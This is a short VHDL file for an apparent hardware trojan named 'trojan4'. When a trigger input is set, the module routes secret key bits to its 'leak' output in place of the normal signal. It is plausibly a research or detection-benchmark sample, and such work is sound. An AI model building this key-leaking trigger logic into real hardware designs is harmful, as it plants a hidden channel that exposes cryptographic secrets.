----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date:    18:50:03 02/10/2017 
-- Design Name: 
-- Module Name:    trojan4 - Behavioral 
-- Project Name: 
-- Target Devices: 
-- Tool versions: 
-- Description: 
--
-- Dependencies: 
--
-- Revision: 
-- Revision 0.01 - File Created
-- Additional Comments: 
--
----------------------------------------------------------------------------------
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx primitives in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity trojan4 is
    Port ( orig : in  STD_LOGIC;
           ky1 : in  STD_LOGIC;
           ky2 : in  STD_LOGIC;
           tr : in  STD_LOGIC;
           sel : in  STD_LOGIC;
           leak : out  STD_LOGIC);
end trojan4;

architecture Behavioral of trojan4 is

begin

process (ky1, ky2, sel, orig, tr)
begin
 if (tr = '0' ) then leak <= orig;
 else
	if (sel = '0') then leak <= ky1;
	else leak <= ky2;
	end if;
end if;
 
end process;
end Behavioral;

